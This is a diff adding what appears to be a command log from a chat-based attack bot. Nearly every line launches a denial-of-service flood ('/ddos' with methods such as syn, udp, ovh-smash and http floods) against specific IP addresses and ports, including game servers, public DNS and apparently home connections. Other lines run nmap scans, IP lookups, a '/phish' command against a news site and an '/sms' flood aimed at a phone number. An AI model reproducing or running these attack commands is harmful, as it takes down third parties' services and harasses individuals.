@@ -1,0 +1,444 @@
+/nmap 185.185.134.55
+/accounts
+/nmap 185.185.134.55
+/steamcode
+/nmapresult
+/checkip 185.185.134.55
+/ddos tcp 185.185.134.55 dport=60526
+/ddos tcp 185.185.134.55 30 dport=60526
+/ddos tcp 185.185.134.55 120 dport=60526
+/method
+/methods
+/lag
+/ping /ddos tcp 185.185.134.55 30 dport=60526
+/ping 185.185.134.55
+/lag tcp 185.185.134.55 120 120 dport=60526
+/ping 52.154.202.170
+/ping 1.1.1.1
+/ping 185.185.134.55
+/ddos tcp 185.185.134.55 120 dport=80
+/ping 185.185.134.55
+/ddos udp 185.185.134.55 120 dport=80
+/ddos dns 185.185.134.55 120 dport=60526
+/methods
+/ddos udprand 185.185.134.55 120 dport=60526
+/ddos std 185.185.134.55 120 dport=60526
+/ddos ovh 185.185.134.55 120 dport=60526
+/ddos syn 185.185.134.55 120 dport=60526
+/ddos syn 185.185.134.55 120 dport=60526
+/ddos ack 185.185.134.55 120 dport=60526
+/ddos syn 185.185.134.236 300 dport=10009
+/ddos tcp 185.185.134.236 300 dport=10009
+/nmap 185.185.134.236
+/nmapresult
+/ddos syn 185.185.134.55 300 dport=60526
+/ping 185.185.134.236
+/ddos udprand 185.185.134.236 120 dport=10009
+/methods
+/ddos ovh 185.185.134.236 120 dport=10009
+/ddos dns  185.185.134.236 120 dport=10009
+/ddos syn 185.185.134.236 120 dport=10009
+/ddos syn 185.185.134.236 300 dport=10009
+/methods
+/ddos storm 185.185.134.236 120 dport=10009
+/stoplag
+/lagstop
+/ddos syn 185.185.134.55 300 dport=60526
+/ddos syn 185.185.134.55 120 dport=60526
+/ddos syn 185.185.134.55 300 dport=60526
+/lagstop
+/ddos std 185.185.134.236 300 dport=10003
+/ddos std 185.185.134.236 300 dport=10003
+/ddos std 185.185.134.56 300 dport=10022
+/ping 185.185.134.236
+/ddos std 185.185.134.236 30 dport=10000
+/ddos std 185.185.134.236 120 dport=10000
+/ddos std 185.185.134.236 600 dport=10000
+/methods
+/ddos stdhex 185.185.134.236 120 dport=10000
+/ddos syn 185.185.134.236 120 dport=10000
+/ddos udprans 185.185.134.236 120 dport=10000
+/ddos udprand 185.185.134.236 120 dport=10000
+/ddos udpplain 185.185.134.236 120 dport=10000
+/ddos std 185.185.134.236 120 dport=10000
+/ddos std 185.185.134.236 120 dport=10000
+/ddos std 185.185.134.236 120 dport=10000
+/ddos std 185.185.134.236 120 dport=10000
+/ddos std 185.185.134.236 120 dport=10000
+/Spotify
+/ddos syn 185.185.134.56 60 dport=10004
+/ddos std 185.185.134.56 60 dport=10004
+/‏ddos std 185.185.134.55 20 dport=30528
+/ddos std 185.185.134.55 20 dport=30528
+/ddos std 185.185.134.55 60 dport=30528
+/ddos syn 185.185.134.55 60 dport=30528
+/ddos syn 185.185.134.225 60 dport=60526
+/ddos syn 185.185.134.225 60 dport=60526
+/ddos syn 185.185.134.225 60 dport=60526
+/ddos syn 185.185.134.225 60 dport=60526
+/nmap 185.185.134.225
+/ddos syn 185.185.134.225 60 dport=60526
+/ddos syn 185.185.134.225 120 dport=60526
+/ddos tcp 185.185.134.225 120 dport=60526
+/ddos std 185.185.134.225 120 dport=60526
+/ddos udp 185.185.134.225 120 dport=60526
+/ddos std 185.185.134.56 120 dport=10004
+/ddos std 185.185.134.56 300 dport=10004
+/ddos std 185.185.134.56 420 dport=10004
+/ddos std 185.185.134.56 120 dport=10004
+/ddos std 5.9.8.147 30 dport=25565
+/ddos tcp 5.9.8.147 30 dport=25565
+/ddos udp 5.9.8.147 30 dport=25565
+/ddos syn 5.9.8.147 30 dport=25565
+/ddos syn 5.9.8.147 30 dport=25565
+/ddos std 5.9.8.147 30 dport=25565
+/ddos tcp 5.9.8.147 120 dport=25565
+/ddos std 5.9.8.147 120 dport=25565
+/ddos std 172.65.234.77 120 dport=25565
+/ddos std 172.65.234.77 120 dport=25565
+/ddos syn 185.185.134.225 60 dport=60526
+/ddos std 185.185.134.225 300 dport=60526
+/ddos std 185.185.134.225 300 dport=60526
+/ddos std 185.185.134.225 300 dport=60526
+/ddos std 185.185.134.56 600 dport=10004
+/ddos std 185.185.134.225 300 dport=60526
+/ddos std 185.185.134.56 240 dport=10004
+/ddos std 185.185.134.56 240 dport=80
+/ddos std 185.185.134.56 20 dport=80
+/ddos std 185.185.134.56 120 dport=80
+/methods
+/ddos http 120 172.67.6.99 conns=5000
+/ddos http 172.67.6.99 120 conns=5000
+/ddos http 212.199.38.38 120 conns=5000
+/ddos http 212.199.38.38 120 conns=5000
+/ddos http 172.67.6.99 120 conns=5000
+/checkip 213.8.147.220
+/ddos http 213.8.147.220 120 conns=5000
+/ddos http 213.8.147.220 120 conns=5000
+/hitlist
+/methods
+/ddos http 213.8.147.220 120 conns=5000
+/ddos http 104.22.22.122 120 conns=5000
+/ddos http 212.199.38.38 120 domain=    212.199.38.38 conns=5000
+/checkip 107.154.249.27
+/ddos http 107.154.249.27 120 domain=    107.154.249.27 conns=5000
+/nmap 107.154.249.27
+/ddos http 107.154.249.27 120 domain=107.154.249.27 conns=5000
+/nmapresult
+/ddos http 107.154.249.27 120 conns=5000
+/ddos
+/ddos std 185.185.134.56 240 10004
+/
+/nmapresult
+/ddos http 107.154.249.27 120 conns=5000
+/ddos std 185.185.134.56 240 dport=10004
+/ddos std 185.185.134.56 1300 dport=10004
+/reboot
+/tr4p
+/bugbounty
+/ddos std 185.185.134.236 1200 dport=10003
+/methods
+/methods
+/ddos udp 185.185.134.236 120 dport=10003
+/ddos udpplain 185.185.134.236 120 dport=10003
+/ddos std 185.185.134.236 120 dport=10003
+/ddos tcp 185.185.134.236 120 dport=10003
+/ddos dns 185.185.134.236 120 dport=10003
+/ddos vse 185.185.134.236 120 dport=10003
+/ddos ovh 185.185.134.236 120 dport=10003
+/ddos syn 185.185.134.236 60 dport=10003
+/ddos ack 185.185.134.236 60 dport=10003
+/checkip 185.195.134.236
+/nmap 185.185.134.236
+/nmapresult
+/ddos stdhex 185.185.134.236 120 dport=10003
+/nmapresult
+/nmapresult
+/nmapresult
+/ddos std 185.185.134.236 120 dport=10003
+/ddos std 185.185.134.236 120 dport=10003
+/plan <@675837090126102560>
+/ddos std 173.63.241.198 60 dport=80
+/ping 173.63.241.198
+/ddos std 185.185.134.56 120 dport=10004
+/ddos std 185.185.134.56 1200 dport=10004
+/lag std 185.185.134.236 10 1200 10 dport=80
+/lag std 70.175.198.60 1 7 1 dport=80
+/accounts
+/ddos std 185.185.134.56 1200 dport=10004
+/ddos std 185.185.134.236 1200 dport=10003
+/ddos std 185.185.134.242 1200 dport=10001
+/ddos syn 185.185.134.242 1200 dport=10001
+/checkip 185.185.134.242
+/ddos tcp 185.185.134.242 1200 dport=10001
+/ping 185.185.134.242
+/ddos std 185.185.134.56 1200 dport=10004
+/steamcode
+/spotify
+/accounts
+/steamcode
+/steamcode
+/ddos std 185.185.134.56 60 dport=10004
+/ddos std 185.185.134.56 1200 dport=10004
+/ddos std 185.185.134.56 1200 dport=10004
+/ddos std 185.185.134.56 1200 dport=10004
+/ddos udp 172.107.237.226 200 dport=80
+/ddos dns 172.107.237.226 200 dport=80
+/tr4p
+/methods
+/checkip 172.107.237.226
+/vpn
+/vpn
+/checkip 104.27.166.230
+/methods
+/ddos http 104.27.166.230 120 conns=5000
+/ddos std 185.185.134.56 120 dport=10004
+/ddos std 185.185.134.226 120 dport=27015
+/ddos std 185.185.134.236 120 dport=27015
+/ddos std 185.185.134.226 180 dport=27015
+/ddos std 185.185.134.226 180 dport=27015
+/ddos syn 185.185.134.226 180 dport=27015
+/ddos std 185.185.134.236 120 dport=27015
+/ddos std 185.185.134.236 120 dport=27015
+/ddos syb 185.185.134.236 20 dport=27015
+/ddos syn 185.185.134.236 20 dport=27015
+/ddos std 185.185.134.226 180 dport=27015
+/ddos std 185.185.134.236 120 dport=27015
+/checkip 13.248.197.95
+/ddos std 185.185.134.236 10 dport=27015
+/methods
+/ddos syn 185.185.134.236 10 dport=27015
+/ddos udp 185.185.134.236 10 dport=27015
+/ddos tcp 185.185.134.236 10 dport=27015
+/ddos dns 185.185.134.236 10 dport=27015
+/ddos std185.185.134.236 2 dport=27015
+/ddos std 185.185.134.236 2 dport=27015
+/ddos std 185.185.134.236 1 dport=27015
+/ddos std 185.185.134.236 5 dport=27015
+/ddos ovh 185.185.134.236 10 dport=27015
+/ddos vse 185.185.134.236 10 dport=27015
+/ddos syn 185.185.134.236 10 dport=27015
+/ddos ack 185.185.134.236 10 dport=27015
+/ddos stdhex 185.185.134.236 10 dport=27015
+/ddos xmas 185.185.134.236 10 dport=27015
+/ddos stomp 185.185.134.236 10 dport=27015
+/ddos storm 185.185.134.236 10 dport=27015
+/ddos greip 185.185.134.236 10 dport=27015
+/methods
+/ddos greeth 185.185.134.236 10 dport=27015
+/ddos std 185.185.134.236 10 dport=27015
+/ddos udprand 185.185.134.236 10 dport=27015
+/ddos http 185.185.134.236 10 dport=27015
+/ddos std 185.185.134.236 3 dport=27015
+/ddos std 185.185.134.236 3 dport=27015
+/ddos std 185.185.134.236 20 dport=27015
+/ddos std 185.185.134.236 20 dport=27015
+/ddos std 185.185.134.236 60 dport=27015
+/ddos std 185.185.134.236 60 dport=10017
+/ddos std 185.185.134.236 60 dport=10017
+/ddos std 185.185.134.236 10 dport=10017
+/ddos std 185.185.134.236 60 dport=10017
+/ddos std 185.185.134.236 60 dport=27015
+/ddos std 185.185.134.236 60 dport=27015
+/ping 185.185.134.236
+/ping 185.185.134.236:27015
+/ddos std 185.185.134.236 60 dport=27015
+/ping 185.185.134.236:27015
+/ping 185.185.134.236:27015
+/ping 185.185.134.236:27015
+/ddos std 185.185.134.236 60 dport=27015
+/ping 185.185.134.236:27015
+/ddos std 185.185.134.236 60 dport=27015
+/ddos std 185.185.134.236 120 dport=27015
+/ping 185.185.134.236:27015
+/ddos std 185.185.134.242120 dport=10007
+/ddos std 185.185.134.242 120 dport=10007
+/sms
+/sms +9720527005616 10
+/ddos std 185.185.134.228 10 dport=27021
+/ddos std 185.185.134.236 10 dport=27015
+/ddos std 185.185.134.228 10 dport=27021
+/ping 5.200.3.109
+/ddos udp 5.200.3.109 10 dport=80
+/ping 5.200.3.109
+/ping 5.200.3.109
+/checkip 5.200.3.109
+/checkip 162.254.193.102.2
+/checkip 62.254.193.102
+/checkip 162.254.193.102
+/checkip 54.70.138.23
+/checkip 216.98.50.146
+/ddos std 185.185.134.226 30 dport=27015
+/ddos std 185.185.134.23 30 dport=30030
+/ddos std 185.185.134.23 120 dport=30030
+/ddos syn 185.185.134.23 120 dport=30030
+/ddos tcp 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 120 dport=30030
+/ddos std 185.185.134.23 120 dport=30030
+/ddos std 185.185.134.23 120 dport=30030
+/ddos syn 185.185.134.23 10 dport=30030
+/ddos udp 185.185.134.23 10 dport=30030
+/ddos udp 185.185.134.23 10 dport=30030
+/ddos tcp 185.185.134.23 10 dport=30030
+/methods
+/ddos dns 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 10 dport=30030
+/ddos syn 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 30 dport=30030
+/ddos stdhex 185.185.134.23 10 dport=30030
+/ddos dns 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 120 dport=30030
+/ddos std 185.185.134.23 120 dport=30030
+/ddos std 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 30 dport=30030
+/ddos std 185.185.134.23 40 dport=30030
+/ddos std 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.23 60 dport=30030
+/ddos std 185.185.134.23 120 dport=30030
+/ping 96.250.218.145
+/ping 96.250.218.145
+/checkip 96.250.218.145
+/ddos std 185.185.134.23 10 dport=30030
+/checkip 68.41.159.120
+/ddos std 185.185.134.23 10 dport=30030
+/ping 68.41.159.120
+/ddos std 185.185.134.23 10 dport=30030
+/ddos std 185.185.134.236 120 dport=27015
+/ddos std 185.185.134.236 120 dport=27015
+/ddos std 185.185.134.242 120 dport=10001
+/ddos std 185.185.134.23 120 dport=27070
+/checkip
+/checkip 185.185.134.23
+/checkip 185.185.134.23
+/ddos std 185.185.134.23 120 dport=3389
+/checkip 172.67.134.59
+/ddos http 172.67.134.59 120 conns=443
+/ddos std 172.67.134.59 120 dport=443
+/ping 151.101.114.217
+/checkip 151.101.114.217
+/ddos http 151.101.114.217 10 conns=5000
+/ddos http 151.101.114.217 10 conns=5000
+/ddos http 151.101.114.217 120 conns=50000
+/ddos http 151.101.114.217 120 conns=50000
+/methods
+/ddos mstd 185.185.134.56 20 dport=10004
+/ddos mtcp 185.185.134.56 20 dport=10004
+/tr4p
+/ddos mtcp 185.185.134.56 20 dport=10004
+/ddos mstd 185.185.134.56 20 dport=10004
+/checkip 162.247.229.67
+/ping 1.1.1.1
+/ping 8.8.8.4
+/ping 8.8.8.3
+/ping 8.8.4.4
+/methods
+/ddos mudpplain 8.8.4.4 80
+/ping 8.8.4.4
+/ping 8.8.4.4
+/ddos mstd 185.185.134.56 20 dport=10004
+/ddos std 185.185.134.56 20 dport=10004
+/ddos mstd 185.185.134.56 20 dport=10004
+/ddos msyn 185.185.134.56 20 dport=10004
+/ddos mstdhex185.185.134.56 20 dport=10004
+/ddos mstdhex 185.185.134.56 20 dport=10004
+/ddos std 185.185.134.56 20 dport=10004
+/ddos std 185.185.134.56 20 dport=10004
+/ping 8.8.4.4
+/ddos udp 8.8.4.4 30
+/ping 8.8.4.4
+/ping 8.8.4.4
+/ddos std 185.185.134.56 40 dport=10004
+/ddos std 185.185.134.226 30 dport=27015
+/ddos std 185.185.134.226 30 27015
+/info
+/help
+/phish https://www.haaretz.co.il/
+/checkip https://www.haaretz.co.il/
+/checkip 192.118.72.27
+/ddos http 192.118.72.27 120 conns=5000
+/methods
+/ddos http 192.118.72.27 120 domain=192.118.72.27 conns=5000
+/ddos std 185.185.134.56 120 10004
+/checkip 104.27.164.240
+/ddos http 104.27.164.240 120 443
+/plan
+/ddos std 185.185.134.56 120 10004
+/ddos std 185.185.134.243 120 10004
+/ddos std 185.185.134.243 180 10004
+/ddos syn 185.185.134.243  10 10004
+/vpn
+/ddos syn 185.185.134.243  10 10001
+/ddos syn 185.185.134.243  110 10004
+/ddos std 185.185.134.243  120 10004
+/methods
+/methods
+/ddos tcp 185.185.134.243  120 10004
+/ddos nfo-down 185.185.134.243  120 10004
+/ddos ovh-smash 185.185.134.243  120 10004
+/ddos ovh-smash 185.185.134.243  20 10004
+/ddos nfo-down 185.185.134.243 10 10004
+/ddos syn 185.185.134.243  120 10004
+/ddos std 185.185.134.243 10 10003
+/ddos std 185.185.134.243 30 10003
+/ddos std 185.185.134.24 30 10002
+/ddos std 185.185.134.236 30 27015
+/ddos syn 185.185.134.236 30 27015
+/ddos std 185.185.134.236 120 27015
+/ddos tcp 185.185.134.236 10 27015
+/ddos tcp 54.36.127.82 10 9601
+/ddos std 54.36.127.82 10 9601
+/methods
+/ddos udp 54.36.127.82 10 9601
+/ddos syn 54.36.127.82 10 9601
+/ddos ack 54.36.127.82 10 9601
+/ddos vse 54.36.127.82 10 9601
+/ddos std 185.185.134.236 120 27015
+/ddos syn 185.185.134.236 30 27015
+/methods
+/ddos nfo-down 185.185.134.236 30 27015
+/ddos syn 185.185.134.236 180 27015
+/ddos std 185.185.134.243 20 10009
+/ddos syn 185.185.134.243 20 10009
+/ddos vse 185.185.134.243 20 10009
+/ddos std 185.185.134.243 20 10009
+/ddos std 185.185.134.236 30 27015
+/ddos std 185.185.134.236 180 27015
+/ddos udp 8.8.4.4 10 27015
+/checkip 8.8.4.4
+/checkip 93.132.24.91
+/checkip 73.132.24.91
+/ddos udp 93.172.25.91 10 80
+/ddos udp 79.177.47.124 10 80
+/ddos udp 93.172.25.91 30 80
+/ddos std 185.185.134.236 180 27015
+/ddos std 185.185.134.236 20 27015
+/ddos std 185.185.134.236 30 27015
+/ddos http 141.138.168.126 200 conns=5000
+/ping 208.109.192.70
+/bots
+/info
+/checkip 52.157.234.163
+/ddos std 216.52.53.69 20 27015
+/checkip 185.25.182.77
+/ddos std 185.25.182.77 20 27026
+/checkip 212.199.38.38
+/ddos stdhex 69.163.162.136 20 dport=http://unicodesnowmanforyou.com/
+/ddos stdhex 69.163.162.136 120 dport=http://unicodesnowmanforyou.com/
+/ddos stdhex 185.199.111.153 120 dport=https://dragonwhisperer.github.io/HebrewAnimeSearch/#
+/ddos stdhex 185.199.111.153 120 80
+/checkip /ddos stdhex 185.199.111.153 120 80
+/checkip 185.199.111.153
+/checkip 104.27.167.230
+/ddos stdhex 104.27.167.230 20 80
+/ddos udp 79.177.47.124 10 80
+/ddos udp 79.177.47.124 30 80
+/ddos std 185.185.134.23 120 27055
+/ddos std 185.185.134.23 180 27055
+/ddos syn 185.185.134.23 60 27055
+/methods
+/ddos stdhex 185.185.134.23 60 27055
+/checkip 162.159.129.235
+/ddos std 162.159.129.235 30
